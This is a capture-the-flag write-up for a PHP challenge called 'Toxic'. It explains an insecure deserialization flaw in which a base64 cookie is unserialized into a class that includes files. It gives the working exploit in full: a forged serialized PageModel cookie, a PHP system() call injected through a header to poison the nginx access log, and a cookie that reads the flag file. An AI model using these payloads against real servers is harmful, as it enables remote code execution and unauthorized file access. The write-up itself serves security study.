# Toxic
![Screenshot from 2021-08-15 20-36-15](https://user-images.githubusercontent.com/87865134/129480430-63e05a73-ad28-4517-a217-82cf94af8ae0.png)

## - Download source code and analysis
- `PageModel` include file when it destruct:
```php
class PageModel
{
    public $file;

    public function __destruct() 
    {
        include($this->file);
    }
}
```
- web use `cookie` to save **serialize** of object PageModel and **unserialize** using **cookie**
```php
spl_autoload_register(function ($name){
    if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID', 
        base64_encode(serialize($page)), 
        time()+60*60*24, 
        '/'
    );
} 

$cookie = base64_decode($_COOKIE['PHPSESSID']);
unserialize($cookie);
```
 > it is Insecure deserialization vulnerability

## - Exploit
1. **Use Burpsuite intercept request and repeat it with modified cookie**
  - modify cookie:
  ```php
  O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}
  ```
  - modify User-Agent header: 
  ```
    Host: <?php system('ls /') ?>
  ```
  - send request and view list files in directory:
  ![Screenshot from 2021-08-15 20-56-08](https://user-images.githubusercontent.com/87865134/129480931-3dbac12a-d6ef-4beb-9798-37c5ea6b5b56.png)
  > found file flag `flag_Eyo06`
  
2. **Read file to get flag**
- Modify cookie to read file `flag_Eyo06`
```php
O:9:"PageModel":1:{s:4:"file";s:11:"/flag_Eyo06";}
```
![Screenshot from 2021-08-15 20-59-15](https://user-images.githubusercontent.com/87865134/129480985-df62edaa-ab61-4f5c-af60-9f16f630186d.png)

## - Description
> **category**: Insecure Deserialization
